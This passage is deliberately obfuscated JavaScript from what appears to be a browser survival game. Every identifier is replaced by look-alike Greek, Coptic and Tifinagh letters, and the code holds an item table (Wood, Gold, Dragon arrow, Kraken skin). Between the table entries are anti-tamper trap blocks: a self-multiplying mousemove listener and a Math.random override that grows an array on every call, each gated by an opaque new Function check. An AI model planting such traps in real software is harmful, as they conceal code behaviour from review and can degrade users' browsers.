			"ΔΔⲆⵠⲆ": ᐃⲆ++,
			"ⵠⲆⲆΔⲆ": ᐃⲆ++,
			"ⵠᐃⲆⵠΔ": ᐃⲆ++,
			"ᐃΔⵠᐃⵠ": ᐃⲆ++,
			"ᐃⲆᐃΔᐃ": ᐃⲆ++,
			"ΔᐃⲆΔⲆ": ᐃⲆ++,
			"ⲆᐃⲆⲆΔ": ᐃⲆ++,
			"ΔⵠᐃⲆⵠ": ᐃⲆ++,
			"ᐃᐃⲆⵠᐃ": ᐃⲆ++,
			"ⲆⲆⵠΔⲆ": ᐃⲆ++,
			"ΔⵠΔΔⲆ": ᐃⲆ++,
			"ⵠⵠⲆΔⲆ": ᐃⲆ++,
			"ΔᐃΔΔΔ": ᐃⲆ++,
			"ⲆⲆⵠᐃⵠ": ᐃⲆ++,
			"ΔⲆⲆΔᐃ": ᐃⲆ++,
			"ᐃᐃΔⲆΔ": ᐃⲆ++,
			"ⲆⵠⵠᐃΔ": ᐃⲆ++,
			"ᐃⵠᐃⲆⲆ": ᐃⲆ++,
			"ᐃᐃΔΔΔ": ᐃⲆ++,
			"ΔⵠⲆΔᐃ": ᐃⲆ++,
			"ΔⵠⲆⵠΔ": ᐃⲆ++,
			"ᐃⵠΔⲆᐃ": ᐃⲆ++,
			"ⵠΔΔᐃⲆ": ᐃⲆ++,
			"ⲆⵠⲆⵠΔ": ᐃⲆ++,
			"ᐃΔⲆⲆⲆ": ᐃⲆ++,
			"ⵠⵠⲆⵠⲆ": ᐃⲆ++,
			"ⵠᐃᐃⵠ": ᐃⲆ++,
			"ⵠⵠᐃⲆⲆ": ᐃⲆ++,
			"ⵠⲆⵠΔᐃ": ᐃⲆ++,
			"ⵠⲆᐃΔⲆ": ᐃⲆ++,
			"ⲆⲆΔᐃΔ": ᐃⲆ++,
			"ΔⵠⲆⲆᐃ": ᐃⲆ++,
			"ΔⵠⲆΔⲆ": ᐃⲆ++,
			"ⲆᐃⵠΔⲆ": ᐃⲆ++,
			"ᐃᐃᐃⲆⵠ": ᐃⲆ++,
			"ⲆⵠⵠⲆⵠ": ᐃⲆ++,
			"ΔΔΔⵠΔ": ᐃⲆ++,
			"ⲆⵠΔᐃⲆ": ᐃⲆ++,
			"ΔⵠᐃⲆⲆ": ᐃⲆ++,
			"ΔⲆΔⵠⵠ": ᐃⲆ++,
			"ⲆⵠΔⲆΔ": ᐃⲆ++,
			"ⵠⵠⲆⲆᐃ": ᐃⲆ++,
			"ᐃⵠⵠⵠᐃ": ᐃⲆ++,
			"ΔⵠⵠΔᐃ": ᐃⲆ++,
			"ΔⵠᐃΔⲆ": ᐃⲆ++,
			"ᐃⲆΔΔⵠ": ᐃⲆ++,
			"ⵠⲆⲆⵠⵠ": ᐃⲆ++,
			"ΔΔⲆⵠΔ": ᐃⲆ++,
			"ⵠᐃΔΔᐃ": ᐃⲆ++,
			"ⵠᐃᐃⲆΔ": ᐃⲆ++,
			"ᐃΔⲆᐃᐃ": ᐃⲆ++,
			"ⵠΔᐃⵠΔ": ᐃⲆ++,
			"ΔΔᐃⲆΔ": ᐃⲆ++,
			"ΔΔⵠᐃⵠ": ᐃⲆ++,
			"ΔΔⵠᐃᐃ": ᐃⲆ++,
			"ᐃⵠⵠⲆΔ": ᐃⲆ++,
			"ⵠᐃⲆⲆⵠ": ᐃⲆ++,
			"ⵠⵠᐃⵠΔ": ᐃⲆ++,
			"ΔⲆⲆⲆⲆ": ᐃⲆ++,
			"ᐃⲆⲆᐃⲆ": ᐃⲆ++,
			"ⵠⲆⵠⲆᐃ": ᐃⲆ++,
			"ⵠᐃΔⲆⵠ": ᐃⲆ++,
			"ᐃΔⲆᐃΔ": ᐃⲆ++,
			"ᐃⲆⵠⲆⵠ": ᐃⲆ++,
			"ᐃⵠΔⵠΔ": ᐃⲆ++,
			"ⲆⲆᐃᐃΔ": ᐃⲆ++,
			"ⵠΔΔⵠⵠ": ᐃⲆ++,
			"ᐃᐃΔⵠᐃ": ᐃⲆ++,
			"ⵠⲆⲆⲆΔ": ᐃⲆ++,
			"ΔᐃⵠΔⲆ": ᐃⲆ++,
			"ⲆΔⲆⵠⵠ": ᐃⲆ++,
			"ⲆᐃⵠᐃⲆ": ᐃⲆ++,
			"ⲆⵠⵠΔᐃ": ᐃⲆ++,
			"ᐃᐃᐃⵠΔ": ᐃⲆ++,
			"Ⲇⵠᐃⵠⵠ": ᐃⲆ++,
			"ᐃΔⵠⲆⲆ": ᐃⲆ++,
			"ΔᐃᐃΔΔ": ᐃⲆ++,
			"ⲆⲆΔᐃᐃ": ᐃⲆ++,
			"ⲆⲆⵠᐃᐃ": ᐃⲆ++,
			"ⵠⲆⵠΔⵠ": ᐃⲆ++,
			"ⲆⵠᐃΔΔ": ᐃⲆ++,
			"ⲆⲆΔⲆᐃ": ᐃⲆ++,
			"ΔᐃᐃΔᐃ": ᐃⲆ++,
			"ᐃΔⲆᐃⲆ": ᐃⲆ++,
			"ⲆᐃⲆᐃⲆ": ᐃⲆ++,
			"ΔᐃⲆⵠΔ": ᐃⲆ++,
			"ⲆⵠΔⲆⲆ": ᐃⲆ++,
			"ⲆᐃⲆΔⵠ": ᐃⲆ++,
			"ⲆᐃᐃⵠⲆ": ᐃⲆ++,
			"ⵠΔⲆⵠΔ": ᐃⲆ++,
			"ΔⵠᐃⵠⲆ": ᐃⲆ++,
			"ⲆᐃⵠⵠΔ": ᐃⲆ++,
			"ⲆΔΔⵠⵠ": ᐃⲆ++,
			"ⵠΔⲆΔΔ": ᐃⲆ++,
			"ⵠⲆᐃⵠᐃ": ᐃⲆ++,
			"ΔΔⵠⵠⲆ": ᐃⲆ++,
			"ΔⲆᐃⵠⲆ": ᐃⲆ++,
			"ΔⵠⵠⲆᐃ": ᐃⲆ++,
			"ΔᐃΔΔᐃ": ᐃⲆ++,
			"ⲆΔᐃⲆⵠ": ᐃⲆ++,
			"ΔⵠⲆⲆⲆ": ᐃⲆ++,
			"ⵠᐃᐃΔⵠ": ᐃⲆ++,
			"ᐃⵠⵠΔⲆ": ᐃⲆ++,
			"ⲆⵠⲆΔᐃ": ᐃⲆ++,
			"ᐃⵠⲆⵠⵠ": ᐃⲆ++,
			"ᐃᐃΔⲆ": ᐃⲆ++,
			"ⵠⲆⲆᐃ": ᐃⲆ++,
			"ⵠⲆΔⲆⲆ": ᐃⲆ++,
			"ΔⲆⵠⵠ": ᐃⲆ++,
			"ΔⲆᐃΔ": ᐃⲆ++,
			"ⵠⲆΔᐃΔ": ᐃⲆ++,
			"ᐃⲆⲆΔᐃ": ᐃⲆ++,
			"ⵠΔⵠᐃΔ": ᐃⲆ++,
			"ⵠⲆᐃⲆⵠ": ᐃⲆ++,
			"ⲆᐃⲆⲆⲆ": ᐃⲆ++,
			"ⲆⵠⵠⵠⲆ": ᐃⲆ++,
			"ⵠΔⵠΔᐃ": ᐃⲆ++,
			"ⵠΔⵠΔⲆ": ᐃⲆ++,
			"ⲆⵠΔⲆ": ᐃⲆ++,
			"ᐃΔᐃΔⵠ": ᐃⲆ++,
			"ΔⲆⵠⵠᐃ": ᐃⲆ++,
			"ⲆⲆⲆⲆⲆ": ᐃⲆ++,
			"ΔⲆΔⲆᐃ": ᐃⲆ++,
			"ΔⲆⲆΔⵠ": ᐃⲆ++,
			"ⵠⲆᐃᐃᐃ": ᐃⲆ++,
			"ᐃᐃⲆⲆᐃ": ᐃⲆ++,
			"ᐃⲆᐃⲆᐃ": ᐃⲆ++,
			"ⵠᐃⲆᐃⵠ": ᐃⲆ++,
			"ⵠᐃⲆⵠᐃ": ᐃⲆ++,
			"ⲆⵠⲆΔⲆ": ᐃⲆ++,
			"ΔⵠⲆᐃᐃ": ᐃⲆ++,
			"ⵠⲆⲆⲆⵠ": ᐃⲆ++,
			"ΔΔⲆᐃᐃ": ᐃⲆ++,
			"ⲆΔΔⲆᐃ": ᐃⲆ++,
			"ᐃΔΔΔΔ": ᐃⲆ++,
			"Ⲇⵠᐃᐃⵠ": ᐃⲆ++,
			"ⲆⲆⲆᐃᐃ": ᐃⲆ++,
			"ⲆⵠΔⲆᐃ": ᐃⲆ++,
			"ⵠᐃΔⲆⲆ": ᐃⲆ++,
			"ᐃⵠⲆⲆΔ": ᐃⲆ++,
			"ⲆΔⵠΔⲆ": ᐃⲆ++,
			"ⲆⵠᐃⲆⵠ": ᐃⲆ++,
			"ΔⵠⲆⵠⵠ": ᐃⲆ++,
			"ᐃⲆΔⲆⲆ": ᐃⲆ++,
			"ΔΔΔΔᐃ": ᐃⲆ++,
			"ΔΔΔⵠᐃ": ᐃⲆ++,
			"ⵠΔⲆⲆᐃ": ᐃⲆ++,
			"ⲆᐃⵠΔΔ": ᐃⲆ++,
			"ⵠⵠᐃⲆⵠ": ᐃⲆ++,
			"ΔᐃΔⲆᐃ": ᐃⲆ++,
			"ᐃⵠᐃⲆⵠ": ᐃⲆ++,
			"ⲆΔΔΔᐃ": ᐃⲆ++,
			"ⵠⵠΔⵠⵠ": ᐃⲆ++,
			"ᐃᐃΔⲆⲆ": ᐃⲆ++,
			"ⵠᐃΔⲆᐃ": ᐃⲆ++,
			"ΔⵠΔⵠΔ": ᐃⲆ++,
			"ⲆΔᐃⲆᐃ": ᐃⲆ++,
			"ⵠⵠⵠΔⲆ": ᐃⲆ++,
			"ᐃᐃᐃΔΔ": ᐃⲆ++,
			"ⲆΔΔⵠᐃ": ᐃⲆ++,
			"ΔⵠΔⲆⲆ": ᐃⲆ++,
			"ⲆᐃᐃΔⲆ": ᐃⲆ++,
			"ⲆΔⲆᐃᐃ": ᐃⲆ++,
			"ⵠᐃᐃⵠᐃ": ᐃⲆ++,
			"ⵠⵠⵠᐃⵠ": ᐃⲆ++,
			"ⲆΔᐃΔᐃ": ᐃⲆ++,
			"ⲆΔⲆⵠΔ": ᐃⲆ++,
			"ⲆⲆΔⵠⲆ": ᐃⲆ++,
			"ⲆΔⵠΔΔ": ᐃⲆ++,
			"ⵠᐃⵠⵠᐃ": ᐃⲆ++,
			"ⵠⵠⵠᐃⲆ": ᐃⲆ++,
			"ΔᐃᐃᐃΔ": ᐃⲆ++,
			"ΔⲆⵠᐃⵠ": ᐃⲆ++,
			"ΔᐃⲆᐃᐃ": ᐃⲆ++,
			"ᐃᐃΔⵠΔ": ᐃⲆ++,
			"ΔⲆⵠᐃⲆ": ᐃⲆ++,
			"ΔⲆΔⵠΔ": ᐃⲆ++,
			"ΔⵠⵠⵠΔ": ᐃⲆ++,
			"Δⵠⵠⵠⵠ": ᐃⲆ++,
			"ΔⲆᐃΔⵠ": ᐃⲆ++,
			"ᐃⵠᐃⲆᐃ": ᐃⲆ++,
			"ⲆᐃΔᐃᐃ": ᐃⲆ++,
			"ⵠⵠⵠΔⵠ": ᐃⲆ++,
			"ΔΔᐃᐃᐃ": ᐃⲆ++,
			"ⵠΔᐃⲆⲆ": ᐃⲆ++,
			"ⵠⵠΔⲆⵠ": ᐃⲆ++,
			"ⲆⲆⵠΔΔ": ᐃⲆ++,
			"ⵠΔⲆᐃⵠ": ᐃⲆ++,
			"ⵠⲆⲆⵠⲆ": ᐃⲆ++,
			"ⲆΔⵠΔⵠ": ᐃⲆ++,
			"ⵠⵠᐃⵠⲆ": ᐃⲆ++,
			"ᐃⵠᐃΔΔ": ᐃⲆ++,
			"ΔΔⵠⵠᐃ": ᐃⲆ++,
			"ΔⵠⲆΔⵠ": ᐃⲆ++,
			"ᐃΔΔΔⵠ": ᐃⲆ++,
			"ⲆⲆⲆⲆΔ": ᐃⲆ++,
			"ΔᐃⲆⵠⲆ": ᐃⲆ++,
			"ⵠⲆⵠᐃⲆ": ᐃⲆ++,
			"ᐃⲆⲆⲆᐃ": ᐃⲆ++,
			"ⲆΔᐃᐃ": ᐃⲆ++,
			"ΔⵠᐃᐃΔ": ᐃⲆ++,
			"ΔᐃⲆᐃⵠ": ᐃⲆ++,
			"ⵠⲆΔⲆΔ": ᐃⲆ++,
			"ⵠΔⲆᐃΔ": ᐃⲆ++,
			"ᐃⲆⲆᐃⵠ": ᐃⲆ++,
			"ᐃΔⵠⵠⲆ": ᐃⲆ++,
			"ΔΔΔᐃⲆ": ᐃⲆ++,
			"ΔᐃⲆⲆΔ": ᐃⲆ++,
			"ⵠⵠᐃⲆᐃ": ᐃⲆ++,
			"ᐃᐃΔΔⲆ": ᐃⲆ++,
			"ⲆⲆΔⵠⵠ": ᐃⲆ++,
			"ⲆᐃΔΔⲆ": ᐃⲆ++,
			"ⲆⵠⲆᐃᐃ": ᐃⲆ++,
			"ⵠΔⵠᐃⲆ": ᐃⲆ++,
			"ΔᐃΔᐃⵠ": ᐃⲆ++,
			"ⵠⲆΔΔⵠ": ᐃⲆ++,
			"ⵠᐃⲆᐃⲆ": ᐃⲆ++,
			"ⵠⵠⲆΔⵠ": ᐃⲆ++,
			"ⲆⵠΔΔⵠ": ᐃⲆ++,
			"ΔⲆᐃⲆⲆ": ᐃⲆ++,
			"ⵠΔΔⲆⵠ": ᐃⲆ++,
			"ᐃᐃΔΔⵠ": ᐃⲆ++,
			"ⲆᐃⵠⵠⲆ": ᐃⲆ++,
			"ᐃⵠᐃᐃΔ": ᐃⲆ++,
			"ⵠⲆᐃⲆᐃ": ᐃⲆ++,
			"ΔⵠⵠΔⲆ": ᐃⲆ++,
			"ΔΔΔⲆⲆ": ᐃⲆ++,
			"ΔᐃⲆΔᐃ": ᐃⲆ++,
			"ⵠᐃⲆᐃᐃ": ᐃⲆ++,
			"ᐃⲆΔᐃΔ": ᐃⲆ++,
			"ⵠᐃΔᐃΔ": ᐃⲆ++,
			"ⵠⲆⲆᐃᐃ": ᐃⲆ++,
			"ⵠⲆᐃΔⲆⵠⲆ": ᐃⲆ++,
			"ΔⵠΔΔᐃᐃᐃ": ᐃⲆ++,
			"ΔΔᐃΔᐃ": ᐃⲆ++,
			"ⵠΔᐃⵠᐃ": ᐃⲆ++,
			"ⲆⵠᐃⵠⲆ": ᐃⲆ++,
			"ⵠⲆᐃΔΔ": ᐃⲆ++
		};
		var ⵠⲆΔᐃ = {
			"Δⵠⵠⵠᐃ": ⵠⲆⲆ,
			"ⲆΔᐃⵠⲆ": 4,
			"ΔⲆΔⵠᐃ": ⵠⵠⵠΔ,
			"ΔᐃΔⵠΔ": ΔⲆΔᐃ,
			"ⲆⲆΔᐃⲆ": ⵠⲆⵠⵠ,
			"ᐃⲆⲆⲆΔ": 1
		};
		const ⲆᐃⵠΔΔⲆⲆ = ⲆᐃΔⵠⵠ;
		const ⲆⵠΔΔ = ᐃⲆΔⲆ;
		const ΔⲆⲆᐃⲆⲆⲆ = 6883734;
		const ΔᐃⵠΔⲆⲆΔ = ΔⲆⲆᐃⲆⲆⲆ["ΔᐃᐃᐃⲆⲆΔ"];
		const ΔⵠⵠⵠΔⲆⵠⲆᐃ = `const ⵠΔⲆΔᐃ = (typeof ⵠⵠⲆⵠⵠᐃᐃ === "${ΔᐃⵠΔⲆⲆΔ}") ? 1 : 0; return ⵠΔⲆΔᐃ;`;

		function ⵠⵠⲆⵠⵠᐃᐃ() {
			ΔᐃⵠΔⲆⲆΔ;
			ΔⲆⲆᐃⲆⲆⲆ();
			return ΔⵠⵠⵠΔⲆⵠⲆᐃ
		}
		const ⵠΔⲆΔᐃ = 14160596;
		const ⲆΔᐃⲆᐃᐃΔΔΔ = new Function(ⵠⵠⲆⵠⵠᐃᐃ + ΔⵠⵠⵠΔⲆⵠⲆᐃ);
		const ᐃᐃΔᐃⵠᐃⵠ = 12314751;
		if (ⲆΔᐃⲆᐃᐃΔΔΔ(ⵠΔⲆΔᐃ, ᐃᐃΔᐃⵠᐃⵠ) === 1) {
			const ΔⲆⲆᐃⲆⲆⲆ = function() {
				ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[277]]("mousemove", (function() {
					ΔⲆⲆᐃⲆⲆⲆ()
				}))
			};
			ΔⲆⲆᐃⲆⲆⲆ()
		}
		var ⲆⲆⵠᐃ = [];
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠⲆⲆᐃ] = {
			name: "Wood",
			"ᐃⵠ": Ⲇ.ⵠⵠⲆⲆⲆⵠⲆ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": 0
		};
		const ᐃᐃⲆⵠⵠ = ⵠⵠⲆΔΔ;
		ⲆⲆⵠᐃ[ᐃᐃ.ᐃᐃΔⲆ] = {
			name: "Stone",
			"ᐃⵠ": Ⲇ.ΔΔᐃⲆΔΔᐃ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": ΔΔⵠ
		};
		const ⲆⵠΔⵠΔ = ⲆΔᐃⲆΔ;
		ⲆⲆⵠᐃ[ᐃᐃ.ΔⲆⵠⵠ] = {
			name: "Gold",
			"ᐃⵠ": Ⲇ.ⵠΔΔᐃΔᐃΔ,
			"ᐃᐃⲆⵠ": ⲆΔⵠ,
			"ⵠⲆⵠΔ": ΔⲆⲆ
		};
		const ᐃᐃⵠⵠⲆ = ⵠⵠⵠⲆᐃ;
		ⲆⲆⵠᐃ[ᐃᐃ.ΔⲆᐃΔ] = {
			name: "Diamond",
			"ᐃⵠ": Ⲇ.ᐃⵠⵠᐃⵠᐃⵠ,
			"ᐃᐃⲆⵠ": ⲆΔⵠ,
			"ⵠⲆⵠΔ": ᐃⵠΔ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆⵠΔⲆ] = {
			name: "Amethyst",
			"ᐃⵠ": Ⲇ.ⲆᐃⲆⵠΔⲆΔ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": ᐃⵠⲆ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆᐃⵠⲆᐃ] = {
			name: "Rabbit fur",
			"ᐃⵠ": Ⲇ.ΔⵠᐃⵠⲆⲆⵠ,
			"ᐃᐃⲆⵠ": ᐃⵠΔ,
			"ⵠⲆⵠΔ": 0
		};
		const ΔⲆⲆⲆ = Ⲇⵠⵠⵠ;
		ⲆⲆⵠᐃ[ᐃᐃ.ΔᐃᐃᐃΔ] = {
			name: "Wolf fur",
			"ᐃⵠ": Ⲇ.ⲆΔΔⵠⵠⲆⲆ,
			"ᐃᐃⲆⵠ": ᐃⵠⲆ,
			"ⵠⲆⵠΔ": 0
		};
		const ⲆΔⵠⲆⵠ = ΔΔΔⲆΔ;
		const ⲆΔᐃΔⵠⵠⲆ = ΔΔⵠΔΔᐃⲆ;
		ⲆⲆⵠᐃ[ᐃᐃ.ΔΔᐃΔᐃ] = {
			name: "Boar fur",
			"ᐃⵠ": Ⲇ.ΔΔⲆⲆΔΔⵠ,
			"ᐃᐃⲆⵠ": ⵠⲆⲆ,
			"ⵠⲆⵠΔ": 0
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ΔⵠⵠⲆᐃ] = {
			name: "Firefly",
			"ᐃⵠ": Ⲇ.ΔⵠᐃΔᐃⲆⵠ,
			"ᐃᐃⲆⵠ": ΔΔⵠ,
			"ⵠⲆⵠΔ": 0
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ΔᐃΔΔᐃ] = {
			name: "Wood arrow",
			"ᐃⵠ": Ⲇ.ᐃΔΔΔⵠⵠⵠ,
			"ᐃᐃⲆⵠ": ΔΔⵠ,
			"ⵠⲆⵠΔ": ΔΔΔ
		};
		const ⲆⲆΔⲆⲆᐃᐃ = ⵠΔⵠⵠⵠ;
		const ΔΔⲆⵠⲆⲆⲆⲆᐃ = ⲆΔᐃᐃΔᐃⵠ;
		const ΔΔⲆⲆΔ = ⵠⵠⲆⲆΔ;
		const ᐃⵠⲆⲆᐃⵠⵠ = ΔⵠΔᐃᐃ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆΔᐃⲆⵠ] = {
			name: "Stone arrow",
			"ᐃⵠ": Ⲇ.ΔΔⲆΔⲆⵠⵠ,
			"ᐃᐃⲆⵠ": ᐃⵠΔ,
			"ⵠⲆⵠΔ": ⵠΔⲆ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ΔⵠⲆⲆⲆ] = {
			name: "Gold arrow",
			"ᐃⵠ": Ⲇ.ΔⲆⲆⲆⵠⲆΔ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": 1
		};
		const ᐃΔᐃᐃΔⲆⵠ = ⲆⵠⲆⲆⲆ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠᐃᐃΔⵠ] = {
			name: "Diamond arrow",
			"ᐃⵠ": Ⲇ.ᐃⲆᐃⵠⲆⵠⲆ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": ⵠΔΔ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ᐃⵠⵠΔⲆ] = {
			name: "Amethyst arrow",
			"ᐃⵠ": Ⲇ.ⵠᐃᐃⲆⲆⲆᐃ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": 1
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆⵠⲆΔᐃ] = {
			name: "Reidite arrow",
			"ᐃⵠ": Ⲇ.ⲆᐃᐃⲆⵠⲆᐃ,
			"ᐃᐃⲆⵠ": ΔΔⵠ,
			"ⵠⲆⵠΔ": ᐃⲆᐃ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ᐃⵠⲆⵠⵠ] = {
			name: "Dragon arrow",
			"ᐃⵠ": Ⲇ.ⲆΔΔⵠⲆⲆᐃ,
			"ᐃᐃⲆⵠ": ᐃⵠⲆ,
			"ⵠⲆⵠΔ": 0
		};
		const ⵠΔΔⵠᐃᐃᐃ = ⵠⲆΔᐃᐃ;
		const ⵠⵠΔⵠ = ⲆΔΔᐃ;
		const ⲆΔⲆⲆΔ = ΔᐃⲆⵠᐃ;
		const ΔᐃⵠᐃⲆ = ΔᐃᐃⲆⲆ;
		ⲆⲆⵠᐃ[ᐃᐃ.ᐃⲆΔⲆⲆ] = {
			name: "Winter fur",
			"ᐃⵠ": Ⲇ.ΔⵠΔⲆᐃⵠΔ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": ΔΔⵠ
		};
		const ᐃⵠᐃⵠᐃⵠⲆ = ⵠⵠᐃΔΔ;
		const ᐃⵠΔⵠⲆⲆⲆ = ⵠΔᐃΔⲆ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠⲆᐃΔΔ] = {
			name: "Fur mammoth",
			"ᐃⵠ": Ⲇ.ⲆΔΔᐃⵠᐃⵠ,
			"ᐃᐃⲆⵠ": ΔⲆⲆ,
			"ⵠⲆⵠΔ": 0
		};
		const ᐃΔⲆᐃᐃΔᐃ = ⲆᐃⲆΔⲆ;
		ⲆⲆⵠᐃ[ᐃᐃ.ᐃᐃᐃΔΔ] = {
			name: "Web",
			"ᐃⵠ": Ⲇ.ⲆΔΔᐃᐃⲆᐃ,
			"ᐃᐃⲆⵠ": ΔΔⵠ,
			"ⵠⲆⵠΔ": 0
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠⲆᐃⲆⵠ] = {
			name: "Meat",
			"ᐃⵠ": Ⲇ.ΔⲆΔΔⵠⵠᐃ,
			"ᐃᐃⲆⵠ": ᐃⵠⲆ,
			"ⵠⲆⵠΔ": ᐃⵠⲆ
		};
		const ᐃᐃⲆΔ = ⵠΔⲆ;
		const ΔΔΔᐃᐃ = ᐃⵠᐃᐃⲆ;
		const ᐃⲆΔΔᐃⵠⲆ = ⵠᐃᐃⵠⲆⵠⲆ;
		ⲆⲆⵠᐃ[ᐃᐃ.ᐃΔΔΔΔ] = {
			name: "Fish",
			"ᐃⵠ": Ⲇ.ⵠΔⲆⲆⵠⲆᐃ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": 0
		};
		const ⲆᐃᐃⲆΔᐃᐃ = 3180289;
		const ΔΔⵠᐃᐃⲆᐃᐃⲆ = ⲆᐃᐃⲆΔᐃᐃ["ᐃⵠⵠΔᐃⵠⲆ"];
		const ΔΔΔΔⲆⲆⵠⲆΔ = `const ΔᐃΔᐃΔᐃΔ = (typeof ᐃⵠᐃⵠⲆⵠⲆ === "${ΔΔⵠᐃᐃⲆᐃᐃⲆ}") ? 1 : 0; return ΔᐃΔᐃΔᐃΔ;`;

		function ᐃⵠᐃⵠⲆⵠⲆ() {
			ΔΔⵠᐃᐃⲆᐃᐃⲆ;
			ⲆᐃᐃⲆΔᐃᐃ();
			return ΔΔΔΔⲆⲆⵠⲆΔ
		}
		const ΔᐃΔᐃΔᐃΔ = 14541971;
		const ᐃⵠⵠΔⵠᐃⵠ = new Function(ᐃⵠᐃⵠⲆⵠⲆ + ΔΔΔΔⲆⲆⵠⲆΔ);
		const ᐃΔⵠⲆⲆΔⵠⵠΔ = 5181216;
		if (ᐃⵠⵠΔⵠᐃⵠ(ΔᐃΔᐃΔᐃΔ, ᐃΔⵠⲆⲆΔⵠⵠΔ) === 1) {
			const ⲆᐃᐃⲆΔᐃᐃ = Math.random;
			const ᐃⵠⵠΔᐃⵠⲆ = [];
			const ΔΔⵠᐃᐃⲆᐃᐃⲆ = function() {
				for (let ΔΔΔΔⲆⲆⵠⲆΔ = 0; ΔΔΔΔⲆⲆⵠⲆΔ < 4784; ΔΔΔΔⲆⲆⵠⲆΔ++) ᐃⵠⵠΔᐃⵠⲆ.push(ΔΔΔΔⲆⲆⵠⲆΔ);
				return ⲆᐃᐃⲆΔᐃᐃ()
			};
			Math.random = ΔΔⵠᐃᐃⲆᐃᐃⲆ
		}
		ⲆⲆⵠᐃ[ᐃᐃ.ᐃⲆᐃⲆᐃ] = {
			name: "Kraken skin",
			"ᐃⵠ": Ⲇ.ⲆΔⵠⲆⲆΔΔ,
			"ᐃᐃⲆⵠ": ᐃⵠⲆ,
			"ⵠⲆⵠΔ": 0
		};
		const ⲆⵠⵠⲆΔ = ⲆⲆᐃⵠΔ;
		const ⵠⵠᐃⵠᐃᐃᐃᐃⵠ = ⵠⵠⵠⲆᐃΔⲆ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆⲆⲆᐃᐃ] = {
			name: "Piranha scales",
			"ᐃⵠ": Ⲇ.ⲆⲆⲆᐃᐃΔΔ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": ΔΔⵠ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ᐃⵠⲆⲆΔ] = {
			name: "Ice",
			"ᐃⵠ": Ⲇ.ΔᐃⲆⲆⲆⲆⲆ,
			"ᐃᐃⲆⵠ": ΔⲆⲆ,
			"ⵠⲆⵠΔ": ᐃΔΔ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ΔⲆⲆΔⵠ] = {
			name: "Sand",
			"ᐃⵠ": Ⲇ.ⲆⲆᐃⲆΔᐃⵠ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": 0
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆⵠΔⲆᐃ] = {
			name: "Dirt",
			"ᐃⵠ": Ⲇ.ΔΔⵠⵠᐃΔⲆ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": ΔⲆⲆ
		};
		const ᐃΔⲆᐃⲆᐃⲆ = ᐃⲆⵠᐃⲆ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠⲆΔⲆⲆ] = {
			name: "Berrie",
			"ᐃⵠ": Ⲇ.ΔⲆⵠᐃΔⵠⵠ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": 0
		};
		const ⲆᐃᐃΔⵠᐃΔ = ΔᐃⲆⲆⲆ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠᐃⲆⵠᐃ] = {
			name: "Flour",
			"ᐃⵠ": Ⲇ.ᐃΔᐃΔⵠᐃⵠ,
			"ᐃᐃⲆⵠ": ΔⲆⲆ,
			"ⵠⲆⵠΔ": 0
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠⲆⲆⲆⵠ] = {
			name: "Flour",
			"ᐃⵠ": Ⲇ.ⵠⲆΔᐃⲆⲆᐃ,
			"ᐃᐃⲆⵠ": ⵠⲆⲆ,
			"ⵠⲆⵠΔ": 0
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ΔⲆⵠᐃⲆ] = {
			name: "Special fur peasant",
			"ᐃⵠ": Ⲇ.ⵠᐃᐃΔᐃᐃⵠ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": 0
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ΔⲆΔⵠΔ] = {
			name: "Special fur hood",
			"ᐃⵠ": Ⲇ.ⲆⵠΔⵠᐃᐃⵠ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": 0
		};
		const ⲆⲆⲆⲆᐃ = ⲆᐃΔⲆᐃ;
		const ᐃᐃΔᐃⲆⵠᐃ = ᐃᐃᐃᐃⲆ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆⲆⵠΔΔ] = {
			name: "Pumpkin",
			"ᐃⵠ": Ⲇ.ΔⲆⵠΔᐃΔⲆ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": 0
		};
		const ⵠⲆⵠᐃᐃᐃⵠ = 12747349;

		function ⲆᐃΔᐃᐃΔⲆ(ΔⵠΔᐃ) {
			return ᐃⲆᐃΔᐃⵠᐃ.String.fromCharCode(ΔⵠΔᐃ)
		}

		function ⲆⲆΔⲆΔΔⲆ(ᐃⵠᐃᐃΔⵠΔ) {
			return ᐃⵠᐃᐃΔⵠΔ.map(ⲆᐃΔᐃᐃΔⲆ).join("")
		}
		const ΔΔⲆΔᐃΔⵠ = function() {
